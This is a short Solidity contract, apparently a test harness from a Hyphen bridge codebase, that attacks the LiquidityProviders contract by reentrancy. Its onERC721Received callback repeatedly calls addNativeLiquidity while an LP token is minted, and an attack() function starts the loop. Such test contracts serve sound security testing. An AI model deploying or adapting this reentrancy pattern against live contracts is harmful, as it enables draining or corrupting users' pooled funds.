// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
import "../hyphen/LiquidityProviders.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC721/IERC721ReceiverUpgradeable.sol";

contract TokenMintingReentrancy is IERC721ReceiverUpgradeable {
    LiquidityProviders public liquidityproviders;

    constructor(address _lproviders) {
        liquidityproviders = LiquidityProviders(payable(_lproviders));
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        if (tokenId < 10) {
            liquidityproviders.addNativeLiquidity{value: 1e12}();
        }
        return IERC721ReceiverUpgradeable.onERC721Received.selector;
    }

    receive() external payable {}

    function attack() external payable {
        liquidityproviders.addNativeLiquidity{value: msg.value}();
    }
}
